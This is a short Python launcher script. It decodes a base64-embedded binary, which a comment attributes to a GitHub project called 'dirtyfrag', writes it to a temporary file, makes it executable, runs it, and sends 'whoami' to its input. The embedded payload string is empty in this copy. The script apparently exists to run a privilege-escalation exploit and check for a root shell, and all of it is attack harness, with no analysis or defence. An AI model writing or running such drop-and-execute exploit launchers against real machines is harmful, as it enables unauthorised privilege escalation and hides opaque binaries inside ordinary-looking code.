import base64
import os
import stat
import subprocess
import tempfile

# base64 of binary build x86: https://github.com/v4bel/dirtyfrag
BINARY_B64 = """"""

fd, path = tempfile.mkstemp()
os.write(fd, base64.b64decode(BINARY_B64))
os.close(fd)

os.chmod(path, os.stat(path).st_mode | stat.S_IEXEC)

p = subprocess.Popen(
    [path],
    stdin=subprocess.PIPE,
    text=True
)

p.stdin.write("whoami\n")
p.stdin.flush()
p.wait()